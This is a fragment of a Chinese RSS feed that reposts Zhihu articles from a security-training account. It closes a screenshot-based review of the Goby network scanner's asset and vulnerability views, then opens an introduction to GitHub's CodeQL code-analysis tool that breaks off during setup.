lazy&quot; width=&quot;1152&quot; data-original=&quot;https://pic1.zhimg.com/v2-088d61c2866f2bcb8f6637076998df9c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-088d61c2866f2bcb8f6637076998df9c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;（不得不说，界面做得挺炫酷的，功能也齐全，良心软件啊，给作者点赞👍）&lt;/p&gt;&lt;p&gt;不一会儿就扫描完成了，让我们来瞅瞅扫出来些啥。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815a7861170e44df1cfad61aca195c1c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1152&quot; data-original=&quot;https://pic1.zhimg.com/v2-815a7861170e44df1cfad61aca195c1c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815a7861170e44df1cfad61aca195c1c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1152&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1152&quot; data-original=&quot;https://pic1.zhimg.com/v2-815a7861170e44df1cfad61aca195c1c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-815a7861170e44df1cfad61aca195c1c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;结果分为两类，【资产】与【漏洞】，先看看【资产】。&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;什么是资产？&lt;/b&gt;&lt;br/&gt;资产是可以分析的实体，包括台式机，笔记本电脑，服务器，存储设备，网络设备，电话，平板电脑，虚拟机，云实例，容器等。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-19d3dfe703bd8f540c6f4f210bed1077_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;365&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;949&quot; data-original=&quot;https://pic4.zhimg.com/v2-19d3dfe703bd8f540c6f4f210bed1077_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-19d3dfe703bd8f540c6f4f210bed1077_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;365&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;949&quot; data-original=&quot;https://pic4.zhimg.com/v2-19d3dfe703bd8f540c6f4f210bed1077_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-19d3dfe703bd8f540c6f4f210bed1077_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;资产里面分为【系统软件】与【支撑系统】。里面有其相应的服务分析。&lt;/p&gt;&lt;h2&gt;漏洞&lt;/h2&gt;&lt;p&gt;POC+暴力破解（软的不行来硬的！）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7e0b39eac1cfda1124525019ee16825f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1733&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1733&quot; data-original=&quot;https://pic4.zhimg.com/v2-7e0b39eac1cfda1124525019ee16825f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7e0b39eac1cfda1124525019ee16825f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1733&quot; data-rawheight=&quot;700&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1733&quot; data-original=&quot;https://pic4.zhimg.com/v2-7e0b39eac1cfda1124525019ee16825f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-7e0b39eac1cfda1124525019ee16825f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;基本上涵盖了所有常见漏洞，很多 POC 都是见过很多次的了。&lt;/p&gt;&lt;blockquote&gt;以 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 的独家实战场进行的测试。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b33bcd6dcff8e20cb3cffb591e7ee44_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1724&quot; data-rawheight=&quot;623&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1724&quot; data-original=&quot;https://pic1.zhimg.com/v2-1b33bcd6dcff8e20cb3cffb591e7ee44_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b33bcd6dcff8e20cb3cffb591e7ee44_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1724&quot; data-rawheight=&quot;623&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1724&quot; data-original=&quot;https://pic1.zhimg.com/v2-1b33bcd6dcff8e20cb3cffb591e7ee44_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-1b33bcd6dcff8e20cb3cffb591e7ee44_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;更多功能&lt;/h2&gt;&lt;blockquote&gt;为了更清晰的观察这部分的功能，我们换了一个 IP 段进行扫描。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-03d186284b834b32789a001253a79899_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1726&quot; data-rawheight=&quot;1005&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1726&quot; data-original=&quot;https://pic2.zhimg.com/v2-03d186284b834b32789a001253a79899_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-03d186284b834b32789a001253a79899_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1726&quot; data-rawheight=&quot;1005&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1726&quot; data-original=&quot;https://pic2.zhimg.com/v2-03d186284b834b32789a001253a79899_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-03d186284b834b32789a001253a79899_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;当然，还有除此之外的附加功能，右上角【...】。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-43f10d7856e3a6d7436bfba0bbe7d96f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;343&quot; data-rawheight=&quot;364&quot; class=&quot;content_image&quot; width=&quot;343&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-43f10d7856e3a6d7436bfba0bbe7d96f_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;343&quot; data-rawheight=&quot;364&quot; class=&quot;content_image lazy&quot; width=&quot;343&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-43f10d7856e3a6d7436bfba0bbe7d96f_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;Web检测&lt;/b&gt;&lt;/p&gt;&lt;p&gt;扫描出的 IP 资产的一些基本信息，端口、服务等。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d7aee2fc82fa2004b2546e400d94596_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1728&quot; data-rawheight=&quot;624&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9d7aee2fc82fa2004b2546e400d94596_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d7aee2fc82fa2004b2546e400d94596_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1728&quot; data-rawheight=&quot;624&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1728&quot; data-original=&quot;https://pic3.zhimg.com/v2-9d7aee2fc82fa2004b2546e400d94596_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9d7aee2fc82fa2004b2546e400d94596_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;IP矩阵图&lt;/b&gt;&lt;/p&gt;&lt;p&gt;显示出整个 C 段的 IP 资产及漏洞分布。（nice~）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e7ef491487c5fc58b10056b9a8c0ffbf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1732&quot; data-rawheight=&quot;987&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1732&quot; data-original=&quot;https://pic4.zhimg.com/v2-e7ef491487c5fc58b10056b9a8c0ffbf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e7ef491487c5fc58b10056b9a8c0ffbf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1732&quot; data-rawheight=&quot;987&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1732&quot; data-original=&quot;https://pic4.zhimg.com/v2-e7ef491487c5fc58b10056b9a8c0ffbf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e7ef491487c5fc58b10056b9a8c0ffbf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;网络结构图&lt;/b&gt;&lt;/p&gt;&lt;p&gt;点进去我还以为在加载，中间的点点是加载等待。。。&lt;/p&gt;&lt;p&gt;这就是这个 IP 段的网络结构图，以 root 为中心，&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0d17d0f8ba74019bcb591c161595dca8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1728&quot; data-rawheight=&quot;961&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1728&quot; data-original=&quot;https://pic1.zhimg.com/v2-0d17d0f8ba74019bcb591c161595dca8_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0d17d0f8ba74019bcb591c161595dca8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1728&quot; data-rawheight=&quot;961&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1728&quot; data-original=&quot;https://pic1.zhimg.com/v2-0d17d0f8ba74019bcb591c161595dca8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-0d17d0f8ba74019bcb591c161595dca8_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;当然，可以自己拖动。。。进行资产分类以及一些重点的关注等等（挺好玩的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-066a0b1dc8d48bd13ef9ce306aef9a56_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1155&quot; data-rawheight=&quot;723&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1155&quot; data-original=&quot;https://pic3.zhimg.com/v2-066a0b1dc8d48bd13ef9ce306aef9a56_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-066a0b1dc8d48bd13ef9ce306aef9a56_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1155&quot; data-rawheight=&quot;723&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1155&quot; data-original=&quot;https://pic3.zhimg.com/v2-066a0b1dc8d48bd13ef9ce306aef9a56_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-066a0b1dc8d48bd13ef9ce306aef9a56_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多小功能~&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bd6cd0533874bb6ed709aa4e120f1e1a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;404&quot; data-rawheight=&quot;246&quot; class=&quot;content_image&quot; width=&quot;404&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bd6cd0533874bb6ed709aa4e120f1e1a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;404&quot; data-rawheight=&quot;246&quot; class=&quot;content_image lazy&quot; width=&quot;404&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-bd6cd0533874bb6ed709aa4e120f1e1a_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b0f6d286e071db703ade1417d520deb4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;347&quot; data-rawheight=&quot;150&quot; class=&quot;content_image&quot; width=&quot;347&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b0f6d286e071db703ade1417d520deb4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;347&quot; data-rawheight=&quot;150&quot; class=&quot;content_image lazy&quot; width=&quot;347&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-b0f6d286e071db703ade1417d520deb4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;有关 &lt;b&gt;Goby&lt;/b&gt; 的内容就简单介绍到这里，向作者致敬。更多有关 Goby 的使用及测试请前往 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt; 进行学习，最近推出了一系列免费的网络安全技能包，有关CTF、渗透测试、网络攻防、黑客技巧尽在其中，学它涨姿势💯。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;403&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-bacc5586a9947727c6c17bbaff0c6df1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2019-11-25-93532753</guid>
<pubDate>Mon, 25 Nov 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>通过GitHub官方白帽工具，我找出了10个0day==&gt;CodeQL</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-11-23-92769710.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/92769710&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9daa63241cc1e8575a3bfca8da4a8f57_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;随着共享开源社区的不断发展，越来越多的开源软件出现在我们的视野中，很多 IT 从业人员或多或少都有与开源软件接触或使用开源软件。&lt;/p&gt;&lt;blockquote&gt;开源社区 又称 开放源代码社区，一般由拥有共同兴趣爱好的人所组成，根据相应的开源软件许可证协议公布软件源代码的网络平台，同时也为网络成员提供一个自由学习交流的空间。由于开放源码软件主要被散布在全世界的编程者所开发，开源社区就成了他们沟通交流的必要途径，因此开源社区在推动开源软件发展的过程中起着巨大的作用。&lt;/blockquote&gt;&lt;p&gt;有人可能会问：&lt;b&gt;开源软件安全吗？&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;没有绝对安全的系统。&lt;/blockquote&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b9125e78418fc6507509a3a11254b06b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;337&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-b9125e78418fc6507509a3a11254b06b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b9125e78418fc6507509a3a11254b06b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;600&quot; data-rawheight=&quot;337&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;600&quot; data-original=&quot;https://pic4.zhimg.com/v2-b9125e78418fc6507509a3a11254b06b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-b9125e78418fc6507509a3a11254b06b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;任何程序、系统都会存在漏洞，开源软件也不例外。如果你恰好使用某个软件，恰好它爆出了 CVE 高危，你该怎么办？&lt;/p&gt;&lt;p&gt;作为全球最大的代码开源社区，Github 在世界范围内拥有极高的影响力。&lt;/p&gt;&lt;blockquote&gt;GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 git 作为唯一的版本库格式进行托管，故名 GitHub。作为开源代码库以及版本控制系统，Github 拥有超过900万开发者用户。随着越来越多的应用程序转移到了云上，Github 已经成为了管理软件开发以及发现已有代码的首选方法。&lt;/blockquote&gt;&lt;p&gt;GitHub 当然不允许这样的事件发生，官方成立了专门的针对开源软件的安全实验室，共同寻找、抵御这些安全漏洞。&lt;/p&gt;&lt;p&gt;GitHub 安全实验室：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//securitylab.github.com/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;securitylab.github.com/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-140da2a12fe18a40ec18d2d3243247ea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1118&quot; data-rawheight=&quot;566&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1118&quot; data-original=&quot;https://pic3.zhimg.com/v2-140da2a12fe18a40ec18d2d3243247ea_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-140da2a12fe18a40ec18d2d3243247ea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1118&quot; data-rawheight=&quot;566&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1118&quot; data-original=&quot;https://pic3.zhimg.com/v2-140da2a12fe18a40ec18d2d3243247ea_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-140da2a12fe18a40ec18d2d3243247ea_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;CodeQL🪐&lt;/h2&gt;&lt;p&gt;当然，我们今天的主角就出自这里，来自 GitHub 的代码分析工具 CodeQL。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-bb6c475a454be25f7fba9cbf7c9a2053_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1140&quot; data-rawheight=&quot;435&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1140&quot; data-original=&quot;https://pic4.zhimg.com/v2-bb6c475a454be25f7fba9cbf7c9a2053_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-bb6c475a454be25f7fba9cbf7c9a2053_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1140&quot; data-rawheight=&quot;435&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1140&quot; data-original=&quot;https://pic4.zhimg.com/v2-bb6c475a454be25f7fba9cbf7c9a2053_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-bb6c475a454be25f7fba9cbf7c9a2053_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;使用行业领先的语义代码分析引擎 CodeQL 发现整个代码库中的漏洞。使用 CodeQL，你可以像对待数据一样查询代码。编写查询以查找该漏洞的所有变体，并永久消除它。然后分享你的查询，以帮助其他人也这样做。&lt;/blockquote&gt;&lt;p&gt;使用的是一种查询语言 —— QL，支持对 C++，C#，Java，Python，JavaScript 等多种语言进行分析，可用于分析代码，查找代码中控制流等信息。&lt;/p&gt;&lt;h2&gt;原理&amp;amp;使用⭐（环境：Windows）&lt;/h2&gt;&lt;p&gt;最新版的下载地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/github/codeql-cli-binaries/releases/download/v2.0.0/codeql.zip&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/github/codeq&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l-cli-binaries/releases/download/v2.0.0/codeql.zip&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;然后需要参考官方文档&lt;/p&gt;&lt;p&gt;CodeQL CLI文档：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//help.semmle.com/codeql/codeql-cli.html&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;help.semmle.com/codeql/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;codeql-cli.html&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CodeQL 是如何工作的？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可以通过生成 CodeQL 数据库（即包含表示一种语言的特定版本的源代码的数据的目录）来准备要分析的代码库。创建数据库后，可以通过对数据运行一个或多个查询来对其进行分析。在 CodeQL 存储库中有很多开源查询可供选择探索。总体分三步：&lt;/p&gt;&lt;p&gt;&lt;b&gt;首先，创建一个数据库&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了创建数据库，CodeQL 首先提取代码库中每个源文件的单个关系表示。&lt;/p&gt;&lt;p&gt;对于编译语言，提取通过监视正常的构建过程来起作用。每次调用编译器来处理源文件时，都会创建该文件的副本，并且有关源代码的所有相关信息（例如，有关抽象语法树的语法数据，诸如名称绑定和类型信息之类的语义数据）都会被生成集。&lt;/p&gt;&lt;p&gt;对于解释型语言，提取器直接在源代码上运行，解析依赖项以给出代码库的准确表示。 CodeQL 支持每种语言有一个提取器，以确保提取过程尽可能准确。对于多语言代码库，一次生成一种语言的数据库。提取后，将分析所需的所有数据（关系数据，复制的源文件以及特定于语言的数据库模式，该模式指定数据中的相互关系）导入单个目录中，该目录称为 CodeQL 数据库。&lt;/p&gt;&lt;p&gt;&lt;b&gt;然后，运行查询&lt;/b&gt;&lt;/p&gt;&lt;p&gt;CodeQL 分析包括两个步骤。首先，针对数据库执行一个或多个查询。查询以一种专门设计的面向对象的查询语言 QL 编写。&lt;/p&gt;&lt;p&gt;QL 相关的学习资料（必看）：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//help.semmle.com/QL/learn-ql/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;help.semmle.com/QL/lear&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;n-ql/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;下载相关库文件：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Semmle/ql&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Semmle/ql&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;库文件是开源的，我们要做的是根据这些库文件来编写 QL 脚本。&lt;/p&gt;&lt;p&gt;可通过 CodeQL for VS Code 扩展或 CodeQL CLI 运行从 CodeQL 存储库中标出的查询（或运行自己编写的自定义查询）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;最后，解释查询结果&lt;/b&gt;&lt;/p&gt;&lt;p&gt;将查询执行期间产生的结果转换为在源代码上下文中更有意义的形式。也就是说，以一种突出显示查询旨在查找的潜在问题的方式来解释结果 。&lt;/p&gt;&lt;p&gt;查询包含指示应如何解释结果的元数据属性。例如，某些查询在代码中的单个位置显示一条简单的消息。其他的则显示一系列位置，这些位置代表沿数据流或控制流路径的步骤，以及说明结果重要性的消息。不解释没有元数据的查询，其结果将作为表输出，并且不会显示在源代码中。&lt;/p&gt;&lt;p&gt;解释之后，输出结果以供代码检查和分类。在 Visual Studio Code 的 CodeQL 中，解释后的查询结果会自动显示在源代码中。CodeQL CLI 生成的结果可以输出为多种不同格式，以供不同工具使用。&lt;/p&gt;&lt;p&gt;&lt;b&gt;开始使用&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了方便，先配置一个环境变量吧。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-238da799d608020b5691a2d6a06af7c2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;632&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;632&quot; data-original=&quot;https://pic3.zhimg.com/v2-238da799d608020b5691a2d6a06af7c2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-238da799d608020b5691a2d6a06af7c2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;632&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;632&quot; data-original=&quot;https://pic3.zhimg.com/v2-238da799d608020b5691a2d6a06af7c2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-238da799d608020b5691a2d6a06af7c2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在 VS Code 上安装 CodeQL。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-339e991f3de1cbb9783d13058d60724e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1510&quot; data-rawheight=&quot;710&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1510&quot; 